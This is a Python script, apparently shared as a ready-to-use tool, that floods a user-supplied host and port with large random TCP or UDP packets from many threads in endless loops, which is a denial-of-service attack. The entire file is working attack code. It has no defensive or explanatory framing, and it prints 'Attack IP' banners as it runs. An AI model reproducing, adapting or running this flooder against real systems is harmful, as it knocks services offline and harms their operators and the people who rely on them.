#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("\033[92m                --> C0de By Lee0n123 <--")
print("                 #-- TCP/UDP FLOOD --#\033[0m")
ip = str(input("\033[92mHost/Ip:"))
port = int(input("Port:"))
choice = str(input("UDP(y/n):"))
times = int(input("Time:"))
threads = int(input("Threads:\033[0m"))
print("\033[92mLoading\033[0m")
def run():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("\033[92mAttack IP:",ip,"Port:",port,"\033[0m")
		except:
			print("\033[31mno connection! server maybe down\033[0m")

def run2():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[92mAttack IP:",ip,"Port:",port,"\033[0m")
			
		except:
			print("\033[31mno connection! server maybe down\033[0m")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
